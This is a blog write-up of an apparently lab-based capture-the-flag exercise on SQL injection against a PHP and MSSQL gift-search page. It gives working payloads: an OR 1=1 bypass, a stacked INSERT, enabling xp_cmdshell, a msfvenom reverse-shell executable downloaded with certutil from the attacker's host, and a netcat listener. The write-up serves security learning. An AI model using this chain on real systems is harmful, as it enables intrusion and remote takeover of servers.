---
layout: single
title: "[Day 10] SQL injection Inject the Halls with EXEC Queries"
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

# Day 10 
Is about sql injection

# Theory SQLi
Assuming php is doing a query like this: 

```
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

When we can define the value of 'colour' we could pass ```' OR 1=1 --``` into it.  
* The ```'``` would terminate the string quoting
* The -- would terminate what might come after (Like the other string quoting)

This leads to the query being true for all rows and the result would be filled with all rows.

We also can pass something like this (called stacked query) 

```
' ; INSERT INTO tbl_ornaments (elf_id, colour, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal', 99.99); --
```


# Challenge

## Simple
We see the website url: ```http://10.10.89.208/giftresults.php?age=child&interests=toys&budget=100```

Assuming the php code looks something like: 

```
$age = $_GET['age'];
$interests = $_GET['interests'];
$budget = $_GET['budget'];

$sql = "SELECT name FROM gifts WHERE age = '$age' AND interests = '$interests' AND budget <= '$budget'";

$result = sqlsrv_query($conn, $sql);
```

So lets use the simplest trick of all: 

```http://10.10.89.208/giftresults.php?age=' OR 1=1 -- interests=crafts&budget=30```

## Call cmdshell

```
http://MACHINE_IP/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

This command will enable "advanced options" and it will enable xp_dmcshell.

As the result from a shell command will be returned as row of text and doesn't fit into the original query. So you will most probably not see right away if the code execution worked or not.

### Remote code execution
This step only works if previous step also worked. 

Lets create a payload for reverse shell:
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe```

And lets start a http server on the attack box. This server will serve the forged payload. 
```python3 -m http.server 8000```

calling: ```http://10.10.89.208/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --```

uses certutil to download the payload. 

Lets start listening with netcat on the attackbox on port 4444 and wait for the reverse shell.
```nc -lnvp 4444```

After calling this, we should see the reverseshell communicate. 
```http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --```


Once the connection worked, we are in the database server as the sqlexpress database user.

